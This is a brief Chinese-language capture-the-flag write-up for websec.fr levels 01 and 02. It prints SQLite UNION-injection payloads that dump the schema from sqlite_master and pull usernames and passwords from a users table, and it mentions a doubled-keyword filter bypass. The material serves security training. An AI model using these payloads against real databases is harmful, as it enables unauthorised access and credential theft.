##### level 01

一道SQLite整型注入的题目，找到注入方法后可以查看表结构：

```sqlite
-1 union select name,sql from sqlite_master
```

再尝试

```sqlite
-1 union select username,password from users where id=1
```

即可获取到flag。

##### level 02

前一题基础上加了一个双写绕过，不再赘述。

wp参考：https://faizalhasanwala.me/2019-09-24-websec-fr-writeup/